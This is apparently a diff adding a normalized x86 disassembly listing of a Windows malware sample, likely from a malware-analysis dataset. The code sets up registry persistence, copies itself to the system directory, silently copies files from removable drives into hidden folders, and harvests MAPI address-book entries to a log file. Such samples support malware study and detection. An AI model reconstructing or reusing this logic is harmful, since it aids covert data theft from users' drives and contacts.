@@ -1,0 +1,1403 @@
+sub_401000
+mov eax rwxdata
+call _EH_prolog
+push ecx
+and [ ebp - 0x4 ] 0x0
+push ebx
+push esi
+push edi
+mov [ ebp - 0x10 ] esp
+call sub_401050
+test eax eax
+je rwxdata
+mov ecx [ ebp - 0xc ]
+push 0x1
+pop eax
+pop edi
+pop esi
+mov [ fs : 0x0 ] ecx
+pop ebx
+leave
+retn 0x10
+call sub_40157f
+sub_401050
+mov eax rwxdata
+call _EH_prolog
+push ecx
+push ecx
+push ebx
+push esi
+push edi
+mov [ ebp - 0x10 ] esp
+push rwxdata
+call sub_40103d
+mov [ esp ] rwxdata
+call sub_40103d
+mov [ esp ] rwxdata
+call sub_40103d
+mov [ esp ] rwxdata
+call sub_40103d
+mov [ esp ] rwxdata
+call sub_40103d
+mov [ esp ] rwxdata
+call sub_40103d
+mov [ esp ] rwxdata
+call sub_40103d
+mov [ esp ] rwxdata
+call sub_40103d
+mov [ esp ] rwxdata
+call sub_40103d
+mov edi rwxdata
+push edi
+call sub_40103d
+push rwxdata
+call sub_40103d
+push rwxdata
+call sub_40103d
+push rwxdata
+call sub_40103d
+push rwxdata
+call sub_40103d
+add esp 0x18
+mov esi rwxdata
+push [ esi ]
+call sub_40103d
+add esi 0x4
+pop ecx
+cmp esi rwxdata
+jl rwxdata
+mov esi rwxdata
+push esi
+call sub_40103d
+add esi 0x10
+pop ecx
+cmp esi rwxdata
+jl rwxdata
+mov esi rwxdata
+push 0x100
+push esi
+call [ GetWindowsDirectoryA@IAT ]
+push esi
+push rwxdata
+call strcpy
+mov ebx rwxdata
+push esi
+push ebx
+call strcpy
+push esi
+push rwxdata
+call strcpy
+push esi
+push rwxdata
+call strcpy
+push edi
+push ebx
+call strcat
+push edi
+push esi
+call strcat
+push rwxdata
+push esi
+call strcat
+push edi
+push rwxdata
+call strcat
+add esp 0x40
+push rwxdata
+push rwxdata
+call strcat
+push edi
+push rwxdata
+call strcat
+push edi
+mov edi rwxdata
+push edi
+call strcat
+push rwxdata
+push rwxdata
+call strcat
+push rwxdata
+push edi
+call strcat
+mov edi [ DeleteFileA@IAT ]
+add esp 0x28
+push ebx
+call edi
+push rwxdata
+call edi
+push ebx
+call sub_402042
+push esi
+call sub_402042
+push rwxdata
+call sub_402042
+push ebx
+call sub_401b09
+add esp 0x10
+mov edi rwxdata
+push 0xb
+push edi
+call [ GetWindowsDirectoryA@IAT ]
+mov esi rwxdata
+push edi
+push esi
+call strcpy
+push rwxdata
+push esi
+call strcat
+mov esi rwxdata
+push edi
+push esi
+call strcpy
+push rwxdata
+push esi
+call strcat
+push 0x1
+call sub_401716
+mov edi [ CreateEventA@IAT ]
+add esp 0x24
+xor esi esi
+push rwxdata
+push esi
+push esi
+push esi
+call edi
+push rwxdata
+push esi
+push esi
+push esi
+mov [ rwxdata ] eax
+call edi
+push esi
+mov [ rwxdata ] eax
+call sub_4012b8
+pop ecx
+call sub_401418
+call sub_401e2a
+lea eax [ ebp - 0x14 ]
+push eax
+push esi
+push esi
+push rwxdata
+push esi
+push esi
+call [ CreateThread@IAT ]
+mov [ ebp - 0x4 ] esi
+call sub_402063
+mov ecx [ ebp - 0xc ]
+push 0x1
+pop eax
+pop edi
+pop esi
+mov [ fs : 0x0 ] ecx
+pop ebx
+leave
+retn
+sub_4012b8
+push ebp
+mov ebp esp
+sub esp 0x288
+push ebx
+xor ebx ebx
+push esi
+lea eax [ ebp - 0x4 ]
+push ebx
+push eax
+push ebx
+push 0x2001f
+push ebx
+push rwxdata
+push ebx
+push rwxdata
+push 0x80000002
+mov [ ebp - 0x8 ] 0x80
+xor esi esi
+call [ RegCreateKeyExA@IAT ]
+lea eax [ ebp - 0x8 ]
+push eax
+lea eax [ ebp - 0x88 ]
+push eax
+push ebx
+push ebx
+push rwxdata
+push [ ebp - 0x4 ]
+call [ RegQueryValueExA@IAT ]
+cmp eax ebx
+jne rwxdata
+push edi
+lea eax [ ebp - 0x288 ]
+push 0x200
+push eax
+push ebx
+call [ GetModuleFileNameA@IAT ]
+lea eax [ ebp - 0x288 ]
+push 0x5c
+push eax
+call [ __import_lookup_table_2(MSVCRT:strrchr) ]
+mov esi eax
+inc esi
+push esi
+push rwxdata
+call strcpy
+mov dl [ esi ]
+add esp 0x10
+xor edi edi
+cmp dl bl
+je rwxdata
+mov al [ ebp - 0x88 ]
+push [ ebp - 0x8 ]
+lea eax [ ebp - 0x88 ]
+mov [ ebp + edi - 0x88 ] bl
+push eax
+push 0x1
+push ebx
+push rwxdata
+push [ ebp - 0x4 ]
+call [ RegSetValueExA@IAT ]
+pop edi
+lea ecx [ ebp - 0x88 ]
+mov eax esi
+sub ecx esi
+cmp [ ebp + 0x8 ] ebx
+mov [ esi + rwxdata ] bl
+je rwxdata
+dec al
+mov [ esi + rwxdata ] al
+mov al [ ebp + esi - 0x87 ]
+inc esi
+jmp rwxdata
+inc dl
+inc edi
+mov [ ecx + eax ] dl
+mov dl [ eax + 0x1 ]
+inc eax
+cmp dl bl
+jne rwxdata
+pop esi
+pop ebx
+leave
+retn
+cmp al bl
+je rwxdata
+sub_4013b1
+push ebp
+mov ebp esp
+push ecx
+push esi
+xor esi esi
+lea eax [ ebp - 0x4 ]
+push esi
+push eax
+push esi
+push 0x2001f
+push esi
+push rwxdata
+push esi
+push rwxdata
+push 0x80000002
+call [ RegCreateKeyExA@IAT ]
+cmp [ ebp + 0xc ] 0x1
+push [ ebp + 0x8 ]
+jne rwxdata
+push [ ebp - 0x4 ]
+call [ __import_lookup_table_1(ADVAPI32:RegDeleteValueA) ]
+call strlen
+pop ecx
+push eax
+push [ ebp + 0x8 ]
+push 0x1
+push esi
+push [ ebp + 0x8 ]
+push [ ebp - 0x4 ]
+call [ RegSetValueExA@IAT ]
+jmp rwxdata
+leave
+retn
+push [ ebp - 0x4 ]
+call [ RegCloseKey@IAT ]
+cmp [ ebp - 0x4 ] esi
+pop esi
+je rwxdata
+sub_401418
+push ebp
+mov ebp esp
+sub esp 0x600
+push ebx
+push esi
+push edi
+mov esi rwxdata
+xor edi edi
+push esi
+push edi
+push 0x1f0001
+call [ OpenMutexA@IAT ]
+mov ebx [ __import_lookup_table_0(KERNEL32:GetSystemDirectoryA) ]
+cmp eax edi
+jne rwxdata
+push eax
+call [ __import_lookup_table_0(KERNEL32:CloseHandle) ]
+push [ rwxdata ]
+call [ __import_lookup_table_0(KERNEL32:SetEvent) ]
+push 0x1388
+push [ rwxdata ]
+call [ WaitForSingleObject@IAT ]
+push 0x1f4
+call [ __import_lookup_table_0(KERNEL32:Sleep) ]
+lea eax [ ebp - 0x200 ]
+push 0x200
+push eax
+call ebx
+lea eax [ ebp - 0x200 ]
+push rwxdata
+push eax
+call strcat
+mov edi rwxdata
+lea eax [ ebp - 0x200 ]
+push edi
+push eax
+call strcat
+add esp 0x10
+lea eax [ ebp - 0x200 ]
+push eax
+call [ DeleteFileA@IAT ]
+push 0x0
+push edi
+call sub_4013b1
+pop ecx
+pop ecx
+push esi
+push 0x0
+push 0x0
+call [ __import_lookup_table_0(KERNEL32:CreateMutexA) ]
+xor edi edi
+push esi
+push edi
+push edi
+call [ __import_lookup_table_0(KERNEL32:CreateMutexA) ]
+jmp rwxdata
+push 0x1
+push esi
+call sub_4013b1
+push 0x1
+call sub_4012b8
+add esp 0xc
+pop edi
+pop esi
+pop ebx
+leave
+retn
+lea eax [ ebp - 0x200 ]
+push edi
+push eax
+lea eax [ ebp - 0x600 ]
+push eax
+call [ CopyFileA@IAT ]
+lea eax [ ebp - 0x200 ]
+push eax
+call sub_401c21
+pop ecx
+push 0x1
+call [ __import_lookup_table_0(KERNEL32:ExitProcess) ]
+lea eax [ ebp - 0x600 ]
+push 0x400
+push eax
+push edi
+call [ GetModuleFileNameA@IAT ]
+and [ ebp + eax - 0x600 ] 0x0
+lea eax [ ebp - 0x200 ]
+push 0x200
+push eax
+call ebx
+lea eax [ ebp - 0x200 ]
+push rwxdata
+push eax
+call strcat
+mov esi rwxdata
+lea eax [ ebp - 0x200 ]
+push esi
+push eax
+call strcat
+add esp 0x10
+lea eax [ ebp - 0x200 ]
+push eax
+lea eax [ ebp - 0x600 ]
+push eax
+call [ __import_lookup_table_0(KERNEL32:lstrcmpiA) ]
+test eax eax
+je rwxdata
+sub_40157f
+push ecx
+lea eax [ esp ]
+push eax
+xor eax eax
+push eax
+push eax
+push rwxdata
+push eax
+push eax
+call [ CreateThread@IAT ]
+call sub_4015a8
+push 0x3e8
+call [ __import_lookup_table_0(KERNEL32:Sleep) ]
+jmp rwxdata
+sub_4015a8
+push ebp
+mov ebp esp
+sub esp 0x51c
+and [ ebp - 0x4 ] 0x0
+push 0x0
+call sub_401716
+pop ecx
+lea eax [ ebp - 0x21c ]
+push eax
+push 0x200
+call [ __import_lookup_table_0(KERNEL32:GetLogicalDriveStringsA) ]
+test eax eax
+je rwxdata
+leave
+retn
+cmp [ ebp - 0x21c ] 0x0
+je rwxdata
+push ebx
+push esi
+push edi
+mov edi [ __import_lookup_table_2(MSVCRT:sprintf) ]
+add [ ebp - 0x4 ] ebx
+mov eax [ ebp - 0x4 ]
+cmp [ ebp + eax - 0x21c ] 0x0
+jne rwxdata
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+push eax
+call sub_401818
+test eax eax
+pop ecx
+je rwxdata
+mov eax [ ebp - 0x4 ]
+lea esi [ ebp + eax - 0x21c ]
+push esi
+call strlen
+mov ebx eax
+movsx eax [ esi ]
+push eax
+inc ebx
+call [ toupper@IAT ]
+pop ecx
+cmp eax 0x43
+pop ecx
+jl rwxdata
+pop edi
+pop esi
+pop ebx
+lea eax [ ebp - 0xc ]
+push 0x0
+push eax
+push 0x0
+push esi
+call [ __import_lookup_table_0(KERNEL32:GetDiskFreeSpaceExA) ]
+cmp [ ebp - 0x8 ] 0x0
+ja rwxdata
+push rwxdata
+push esi
+lea eax [ ebp - 0x31c ]
+push rwxdata
+push eax
+call edi
+lea eax [ ebp - 0x31c ]
+push eax
+call sub_401844
+add esp 0x14
+jb rwxdata
+lea eax [ ebp - 0x1c ]
+push eax
+call [ GetLocalTime@IAT ]
+movzx eax [ ebp - 0x10 ]
+push eax
+movzx eax [ ebp - 0x12 ]
+push eax
+movzx eax [ ebp - 0x14 ]
+push eax
+movzx eax [ ebp - 0x16 ]
+push eax
+movzx eax [ ebp - 0x1a ]
+push eax
+movzx eax [ ebp - 0x1c ]
+push eax
+lea eax [ ebp - 0x51c ]
+push rwxdata
+push eax
+call edi
+lea eax [ ebp - 0x51c ]
+push eax
+call sub_4022f7
+push [ ebp - 0x8 ]
+lea eax [ ebp - 0x51c ]
+push [ ebp - 0xc ]
+push esi
+push rwxdata
+push eax
+call edi
+lea eax [ ebp - 0x51c ]
+push eax
+call sub_4022f7
+push rwxdata
+call sub_4022f7
+add esp 0x40
+cmp [ ebp - 0xc ] 0x1e8480
+jae rwxdata
+jb rwxdata
+cmp [ ebp - 0x8 ] 0x0
+ja rwxdata
+push esi
+call sub_401844
+pop ecx
+jmp rwxdata
+cmp [ ebp - 0xc ] 0x3b9aca00
+jae rwxdata
+sub_401716
+push ebp
+mov ebp esp
+sub esp 0x210
+push ebx
+xor ebx ebx
+cmp [ ebp + 0x8 ] ebx
+push edi
+mov [ ebp - 0x4 ] ebx
+jne rwxdata
+lea eax [ ebp - 0x210 ]
+push eax
+push 0x200
+call [ __import_lookup_table_0(KERNEL32:GetLogicalDriveStringsA) ]
+test eax eax
+je rwxdata
+push 0x18
+xor eax eax
+pop ecx
+mov edi rwxdata
+[ edi ]
+cmp [ ebp + 0x8 ] ebx
+jne rwxdata
+cmp [ ebp - 0x210 ] 0x0
+je rwxdata
+pop edi
+pop ebx
+leave
+retn
+xor ecx ecx
+push esi
+lea esi [ ebp - 0x210 ]
+add ecx 0x4
+cmp ecx 0x60
+jl rwxdata
+cmp [ ecx + rwxdata ] ebx
+jne rwxdata
+mov eax [ ebp - 0x4 ]
+add eax [ ebp - 0x8 ]
+cmp [ ebp + eax - 0x210 ] 0x0
+mov [ ebp - 0x4 ] eax
+lea esi [ ebp + eax - 0x210 ]
+jne rwxdata
+push esi
+call [ GetDriveTypeA@IAT ]
+cmp eax 0x2
+je rwxdata
+cmp [ ecx + rwxdata ] ebx
+lea eax [ ecx + rwxdata ]
+je rwxdata
+mov [ eax ] ebx
+push esi
+call strlen
+inc eax
+mov [ ebp - 0x8 ] eax
+movsx eax [ esi ]
+push eax
+call [ toupper@IAT ]
+mov edi eax
+pop ecx
+cmp edi 0x43
+pop ecx
+jl rwxdata
+pop esi
+cmp [ ebp + 0x8 ] ebx
+jne rwxdata
+cmp eax 0x3
+jne rwxdata
+lea ebx [ edi * 4 + rwxdata ]
+lea eax [ ebp - 0x10 ]
+mov [ ebx ] edi
+xor edi edi
+push edi
+push eax
+push edi
+push esi
+call [ __import_lookup_table_0(KERNEL32:GetDiskFreeSpaceExA) ]
+cmp [ ebp - 0xc ] edi
+ja rwxdata
+mov [ edi * 4 + rwxdata ] edi
+jmp rwxdata
+xor ebx ebx
+jb rwxdata
+and [ ebx ] 0x0
+cmp [ ebp - 0x10 ] 0x3b9aca00
+jae rwxdata
+sub_401818
+mov edx [ esp + 0x4 ]
+lea eax [ edx * 4 - 0x104 ]
+cmp [ eax + rwxdata ] 0x0
+lea ecx [ eax + rwxdata ]
+jne rwxdata
+xor eax eax
+retn
+cmp [ eax + rwxdata ] 0x0
+je rwxdata
+push 0x1
+mov [ ecx ] edx
+pop eax
+retn
+sub_401844
+push esi
+push rwxdata
+call sub_402042
+mov esi rwxdata
+push esi
+call sub_402042
+push 0x5c
+push [ esp + 0x14 ]
+call [ __import_lookup_table_2(MSVCRT:strrchr) ]
+add esp 0x10
+test eax eax
+je rwxdata
+push esi
+push [ esp + 0xc ]
+call sub_40187e
+pop ecx
+pop ecx
+pop esi
+retn
+and [ eax ] 0x0
+sub_40187e
+push ebp
+mov ebp esp
+sub esp 0x840
+push ebx
+push esi
+mov esi [ __import_lookup_table_2(MSVCRT:sprintf) ]
+push edi
+push [ ebp + 0x8 ]
+lea eax [ ebp - 0x840 ]
+push rwxdata
+push eax
+call esi
+add esp 0xc
+lea eax [ ebp - 0x140 ]
+push eax
+lea eax [ ebp - 0x840 ]
+push eax
+call [ __import_lookup_table_0(KERNEL32:FindFirstFileA) ]
+mov ebx eax
+cmp ebx 0xffffffff
+je rwxdata
+push 0x1
+pop eax
+mov edi rwxdata
+lea eax [ ebp - 0x140 ]
+push eax
+push ebx
+call [ __import_lookup_table_0(KERNEL32:FindNextFileA) ]
+test eax eax
+je rwxdata
+lea eax [ ebp - 0x114 ]
+push eax
+lea eax [ ebp - 0x440 ]
+push eax
+call strcpy
+lea eax [ ebp - 0x440 ]
+push eax
+lea eax [ ebp - 0x340 ]
+push [ ebp + 0x8 ]
+push edi
+push eax
+call esi
+lea eax [ ebp - 0x440 ]
+push eax
+lea eax [ ebp - 0x640 ]
+push [ ebp + 0xc ]
+push edi
+push eax
+call esi
+add esp 0x28
+test [ ebp - 0x140 ] 0x10
+je rwxdata
+push ebx
+call [ __import_lookup_table_0(KERNEL32:FindClose) ]
+jmp rwxdata
+lea eax [ ebp - 0x640 ]
+push 0x1
+push eax
+lea eax [ ebp - 0x340 ]
+push eax
+call [ CopyFileA@IAT ]
+lea eax [ ebp - 0x340 ]
+push eax
+call [ __import_lookup_table_3(USER32:CharUpperA) ]
+lea eax [ ebp - 0x340 ]
+push rwxdata
+push eax
+call [ strstr@IAT ]
+pop ecx
+test eax eax
+pop ecx
+je rwxdata
+lea eax [ ebp - 0x640 ]
+push 0x0
+push eax
+call [ __import_lookup_table_0(KERNEL32:CreateDirectoryA) ]
+lea eax [ ebp - 0x640 ]
+push eax
+lea eax [ ebp - 0x340 ]
+push eax
+call sub_40187e
+pop ecx
+test eax eax
+pop ecx
+je rwxdata
+cmp [ ebp - 0x114 ] 0x2e
+je rwxdata
+lea eax [ ebp - 0x340 ]
+push eax
+call [ DeleteFileA@IAT ]
+push ebx
+call [ __import_lookup_table_0(KERNEL32:FindClose) ]
+xor eax eax
+jmp rwxdata
+jmp rwxdata
+pop edi
+pop esi
+pop ebx
+leave
+retn
+sub_401b09
+push ebp
+mov ebp esp
+sub esp 0x558
+push esi
+mov esi [ __import_lookup_table_2(MSVCRT:sprintf) ]
+push edi
+lea eax [ ebp - 0x558 ]
+push [ ebp + 0x8 ]
+push rwxdata
+push eax
+call esi
+add esp 0xc
+lea eax [ ebp - 0x158 ]
+push eax
+lea eax [ ebp - 0x558 ]
+push eax
+call [ __import_lookup_table_0(KERNEL32:FindFirstFileA) ]
+mov edi eax
+cmp edi 0xffffffff
+je rwxdata
+push [ ebp + 0x8 ]
+call [ __import_lookup_table_0(KERNEL32:RemoveDirectoryA) ]
+push 0x1
+pop eax
+cmp [ ebp - 0x12c ] 0x2e
+je rwxdata
+lea eax [ ebp - 0x158 ]
+push eax
+push edi
+call [ __import_lookup_table_0(KERNEL32:FindNextFileA) ]
+test eax eax
+je rwxdata
+lea eax [ ebp - 0x12c ]
+push eax
+lea eax [ ebp - 0x358 ]
+push [ ebp + 0x8 ]
+push rwxdata
+push eax
+call esi
+add esp 0x10
+test [ ebp - 0x158 ] 0x10
+je rwxdata
+push edi
+call [ __import_lookup_table_0(KERNEL32:FindClose) ]
+jmp rwxdata
+lea eax [ ebp - 0x18 ]
+push eax
+call [ GetSystemTime@IAT ]
+lea eax [ ebp - 0x8 ]
+push eax
+lea eax [ ebp - 0x18 ]
+push eax
+call [ SystemTimeToFileTime@IAT ]
+add [ ebp - 0x8 ] 0x79b8000
+lea eax [ ebp - 0x8 ]
+push eax
+lea eax [ ebp - 0x144 ]
+push eax
+adc [ ebp - 0x4 ] 0xffffe86d
+call [ __import_lookup_table_0(KERNEL32:CompareFileTime) ]
+test eax eax
+jge rwxdata
+lea eax [ ebp - 0x358 ]
+push eax
+call sub_401b09
+test eax eax
+pop ecx
+je rwxdata
+lea eax [ ebp - 0x358 ]
+push 0x0
+push eax
+call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
+lea eax [ ebp - 0x358 ]
+push eax
+call [ DeleteFileA@IAT ]
+push edi
+call [ __import_lookup_table_0(KERNEL32:FindClose) ]
+xor eax eax
+jmp rwxdata
+jmp rwxdata
+pop edi
+pop esi
+leave
+retn
+sub_401c21
+push ebp
+mov ebp esp
+sub esp 0x254
+push ebx
+push esi
+push rwxdata
+push [ ebp + 0x8 ]
+call [ strstr@IAT ]
+pop ecx
+xor ebx ebx
+test eax eax
+pop ecx
+jne rwxdata
+push 0x44
+lea eax [ ebp - 0x54 ]
+push ebx
+push eax
+call memset
+add esp 0xc
+lea eax [ ebp - 0x10 ]
+mov [ ebp - 0x28 ] 0x1
+mov [ ebp - 0x24 ] bx
+push eax
+lea eax [ ebp - 0x54 ]
+push eax
+push ebx
+push ebx
+push ebx
+push ebx
+push ebx
+push ebx
+push [ ebp + 0x8 ]
+push ebx
+call [ CreateProcessA@IAT ]
+pop esi
+pop ebx
+leave
+retn
+push [ ebp + 0x8 ]
+lea eax [ ebp - 0x254 ]
+push eax
+call strcpy
+mov esi [ __import_lookup_table_2(MSVCRT:strchr) ]
+lea eax [ ebp - 0x254 ]
+push 0x22
+push eax
+call esi
+add esp 0x10
+cmp eax ebx
+je rwxdata
+inc eax
+push 0x22
+push eax
+call esi
+pop ecx
+cmp eax ebx
+pop ecx
+je rwxdata
+mov [ eax ] bl
+lea eax [ ebp - 0x254 ]
+push 0x5c
+push eax
+call [ __import_lookup_table_2(MSVCRT:strrchr) ]
+pop ecx
+cmp eax ebx
+pop ecx
+je rwxdata
+cmp [ eax - 0x1 ] 0x3a
+jne rwxdata
+mov [ eax ] bl
+mov [ eax + 0x1 ] bl
+jmp rwxdata
+lea eax [ ebp - 0x253 ]
+push eax
+call [ SetCurrentDirectoryA@IAT ]
+sub_401e2a
+push ebp
+mov ebp esp
+sub esp 0x148
+push ebx
+push esi
+push rwxdata
+push rwxdata
+xor bl bl
+call [ __import_lookup_table_2(MSVCRT:fopen) ]
+pop ecx
+mov [ ebp - 0x8 ] eax
+test eax eax
+pop ecx
+je rwxdata
+pop esi
+pop ebx
+leave
+retn
+movsx eax bl
+shl eax 0x4
+lea esi [ ebp + eax - 0x148 ]
+push esi
+push rwxdata
+push [ ebp - 0x8 ]
+call [ fscanf@IAT ]
+add esp 0xc
+cmp eax 0xffffffff
+je rwxdata
+test bl bl
+je rwxdata
+push esi
+call strlen
+cmp eax 0x10
+pop ecx
+ja rwxdata
+and [ ebp - 0x4 ] 0x0
+push edi
+movsx edi bl
+xor esi esi
+push esi
+call strlen
+cmp eax 0x2
+pop ecx
+jb rwxdata
+push rwxdata
+lea eax [ ebp + esi - 0x148 ]
+push eax
+jmp rwxdata
+inc bl
+cmp bl 0x14
+jl rwxdata
+cmp [ ebp - 0x4 ] edi
+jge rwxdata
+push [ ebp - 0x8 ]
+call [ fclose@IAT ]
+pop ecx
+pop edi
+lea eax [ esi + rwxdata ]
+push eax
+call strcpy
+inc [ ebp - 0x4 ]
+add esi 0x10
+pop ecx
+cmp esi 0x140
+pop ecx
+jl rwxdata
+sub_402042
+push esi
+mov esi [ esp + 0x8 ]
+push 0x0
+push esi
+call [ __import_lookup_table_0(KERNEL32:CreateDirectoryA) ]
+push esi
+call [ GetFileAttributesA@IAT ]
+or al 0x6
+push eax
+push esi
+call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
+pop esi
+retn
+sub_402063
+push ebp
+mov ebp esp
+sub esp 0x364
+push ebx
+push esi
+push edi
+push 0xa
+pop ecx
+mov esi rwxdata
+lea edi [ ebp - 0x64 ]
+mov al [ rwxdata ]
+[ edi ] [ esi ]
+movsw [ edi ] [ esi ]
+movsb [ edi ] [ esi ]
+mov [ ebp - 0x64 ] al
+lea eax [ ebp - 0x64 ]
+xor ebx ebx
+push eax
+mov [ ebp - 0x8 ] ebx
+mov [ ebp - 0xc ] ebx
+mov [ ebp - 0x4 ] ebx
+call [ __import_lookup_table_0(KERNEL32:LoadLibraryA) ]
+cmp eax ebx
+mov [ ebp - 0x38 ] eax
+je rwxdata
+pop edi
+pop esi
+pop ebx
+leave
+retn
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+push rwxdata
+push eax
+call [ GetProcAddress@IAT ]
+cmp eax ebx
+je rwxdata
+push [ ebp - 0x38 ]
+call [ FreeLibrary@IAT ]
+push ebx
+lea ecx [ ebp - 0x18 ]
+push ebx
+push ecx
+lea ecx [ ebp - 0x14 ]
+push ecx
+call eax
+test eax eax
+jne rwxdata
+mov eax [ ebp - 0x14 ]
+lea edx [ ebp - 0x2c ]
+push edx
+lea edx [ ebp - 0x30 ]
+mov ecx [ eax ]
+push edx
+push eax
+call [ ecx + 0x64 ]
+test eax eax
+jne rwxdata
+lea edx [ ebp - 0xc ]
+mov eax [ ebp - 0x14 ]
+push edx
+lea edx [ ebp - 0x8 ]
+push edx
+mov ecx [ eax ]
+push 0x10
+push ebx
+push [ ebp - 0x2c ]
+push [ ebp - 0x30 ]
+push eax
+call [ ecx + 0x38 ]
+cmp [ ebp - 0x8 ] 0x4
+jne rwxdata
+mov eax [ ebp - 0xc ]
+lea edx [ ebp - 0x4 ]
+push edx
+push ebx
+mov ecx [ eax ]
+push eax
+call [ ecx + 0x38 ]
+mov eax [ ebp - 0x4 ]
+cmp eax ebx
+je rwxdata
+mov ecx [ eax ]
+lea edx [ ebp - 0x1c ]
+push edx
+push ebx
+push eax
+call [ ecx + 0x24 ]
+test eax eax
+jne rwxdata
+mov eax [ ebp - 0x4 ]
+lea edx [ ebp - 0x10 ]
+push edx
+push ebx
+push [ ebp - 0x1c ]
+mov ecx [ eax ]
+push eax
+call [ ecx + 0x4c ]
+mov eax [ ebp - 0x10 ]
+xor ecx ecx
+cmp [ eax ] ebx
+jbe rwxdata
+mov ecx [ ebp - 0x18 ]
+push eax
+push ecx
+mov edx [ ecx ]
+call [ edx + 0x18 ]
+mov [ ebp - 0x20 ] ebx
+mov ebx [ __import_lookup_table_2(MSVCRT:sprintf) ]
+lea eax [ ebp - 0x364 ]
+push rwxdata
+push eax
+call strcat
+lea eax [ ebp - 0x364 ]
+push eax
+call sub_4022be
+mov eax [ ebp - 0x18 ]
+add esp 0xc
+mov ecx [ eax ]
+push edi
+push eax
+call [ ecx + 0x18 ]
+mov eax [ ebp - 0x10 ]
+mov ecx [ ebp - 0x34 ]
+add [ ebp - 0x20 ] 0xc
+cmp ecx [ eax ]
+jb rwxdata
+mov [ ebp - 0x24 ] eax
+mov edx [ ebp - 0x20 ]
+inc ecx
+push ecx
+push rwxdata
+lea edi [ edx + eax + 0x4 ]
+lea eax [ ebp - 0x364 ]
+push eax
+mov [ ebp - 0x34 ] ecx
+call ebx
+xor eax eax
+add esp 0xc
+cmp [ edi + 0x4 ] eax
+mov [ ebp - 0x28 ] eax
+jbe rwxdata
+cmp [ esi ] 0x3003001e
+jne rwxdata
+push [ esi + 0x8 ]
+lea eax [ ebp - 0xe4 ]
+push rwxdata
+push eax
+call ebx
+lea eax [ ebp - 0xe4 ]
+push eax
+lea eax [ ebp - 0x364 ]
+push eax
+call strcat
+add esp 0x14
+cmp [ esi ] 0x3a4f001e
+jne rwxdata
+push [ esi + 0x8 ]
+lea eax [ ebp - 0xe4 ]
+push rwxdata
+push eax
+call ebx
+lea eax [ ebp - 0xe4 ]
+push eax
+lea eax [ ebp - 0x364 ]
+push eax
+call strcat
+add esp 0x14
+cmp [ esi ] 0x3002001e
+jne rwxdata
+push [ esi + 0x8 ]
+lea eax [ ebp - 0xe4 ]
+push rwxdata
+push eax
+call ebx
+lea eax [ ebp - 0xe4 ]
+push eax
+lea eax [ ebp - 0x364 ]
+push eax
+call strcat
+add esp 0x14
+inc [ ebp - 0x28 ]
+add [ ebp - 0x24 ] 0x10
+mov eax [ ebp - 0x28 ]
+cmp eax [ edi + 0x4 ]
+jb rwxdata
+push [ esi + 0x8 ]
+lea eax [ ebp - 0xe4 ]
+push rwxdata
+push eax
+call ebx
+lea eax [ ebp - 0xe4 ]
+push eax
+lea eax [ ebp - 0x364 ]
+push eax
+call strcat
+add esp 0x14
+mov esi [ ebp - 0x24 ]
+add esi [ edi + 0x8 ]
+cmp [ esi ] 0x3001001e
+jne rwxdata
+sub_4022be
+push esi
+push rwxdata
+push rwxdata
+call [ __import_lookup_table_2(MSVCRT:fopen) ]
+pop ecx
+mov esi eax
+pop ecx
+push esi
+push 0x1
+push [ esp + 0x10 ]
+call strlen
+pop ecx
+push eax
+push [ esp + 0x14 ]
+call [ __import_lookup_table_2(MSVCRT:fwrite) ]
+push esi
+call [ fclose@IAT ]
+add esp 0x14
+pop esi
+retn
+sub_4022f7
+push esi
+push rwxdata
+push rwxdata
+call [ __import_lookup_table_2(MSVCRT:fopen) ]
+pop ecx
+mov esi eax
+pop ecx
+push esi
+push 0x1
+push [ esp + 0x10 ]
+call strlen
+pop ecx
+push eax
+push [ esp + 0x14 ]
+call [ __import_lookup_table_2(MSVCRT:fwrite) ]
+push esi
+call [ fclose@IAT ]
+add esp 0x14
+pop esi
+retn
+_start
+push ebp
+mov ebp esp
+push 0xffffffff
+push rwxdata
+push rwxdata
+mov eax [ fs : 0x0 ]
+push eax
+mov [ fs : 0x0 ] esp
+sub esp 0x68
+push ebx
+push esi
+push edi
+mov [ ebp - 0x18 ] esp
+xor ebx ebx
+mov [ ebp - 0x4 ] ebx
+push 0x2
+call [ __set_app_type@IAT ]
+pop ecx
+or [ rwxdata ] 0xffffffff
+or [ rwxdata ] 0xffffffff
+call [ __p__fmode@IAT ]
+mov ecx [ rwxdata ]
+mov [ eax ] ecx
+call [ __import_lookup_table_2(MSVCRT:__p__commode) ]
+mov ecx [ rwxdata ]
+mov [ eax ] ecx
+mov eax [ __import_lookup_table_2(MSVCRT:_adjust_fdiv) ]
+mov eax [ eax ]
+mov [ rwxdata ] eax
+call sub_4024dd
+cmp [ rwxdata ] ebx
+jne rwxdata
+call sub_4024c8
+push rwxdata
+push rwxdata
+call _initterm
+mov eax [ rwxdata ]
+mov [ ebp - 0x6c ] eax
+lea eax [ ebp - 0x6c ]
+push eax
+push [ rwxdata ]
+lea eax [ ebp - 0x64 ]
+push eax
+lea eax [ ebp - 0x70 ]
+push eax
+lea eax [ ebp - 0x60 ]
+push eax
+call [ __getmainargs@IAT ]
+push rwxdata
+push rwxdata
+call _initterm
+add esp 0x24
+mov eax [ __import_lookup_table_2(MSVCRT:_acmdln) ]
+mov esi [ eax ]
+mov [ ebp - 0x74 ] esi
+cmp [ esi ] 0x22
+jne rwxdata
+push rwxdata
+call [ __import_lookup_table_2(MSVCRT:__setusermatherr) ]
+pop ecx
+cmp [ esi ] 0x20
+jbe rwxdata
+inc esi
+mov [ ebp - 0x74 ] esi
+mov al [ esi ]
+cmp al bl
+je rwxdata
+mov al [ esi ]
+cmp al bl
+je rwxdata
+inc esi
+mov [ ebp - 0x74 ] esi
+jmp rwxdata
+cmp [ esi ] 0x22
+jne rwxdata
+cmp al 0x22
+jne rwxdata
+mov [ ebp - 0x30 ] ebx
+lea eax [ ebp - 0x5c ]
+push eax
+call [ __import_lookup_table_0(KERNEL32:GetStartupInfoA) ]
+test [ ebp - 0x30 ] 0x1
+je rwxdata
+cmp al 0x20
+jbe rwxdata
+inc esi
+mov [ ebp - 0x74 ] esi
+push 0xa
+pop eax
+movzx eax [ ebp - 0x2c ]
+jmp rwxdata
+push eax
+push esi
+push ebx
+push ebx
+call [ __import_lookup_table_0(KERNEL32:GetModuleHandleA) ]
+push eax
+call sub_401000
+mov [ ebp - 0x68 ] eax
+push eax
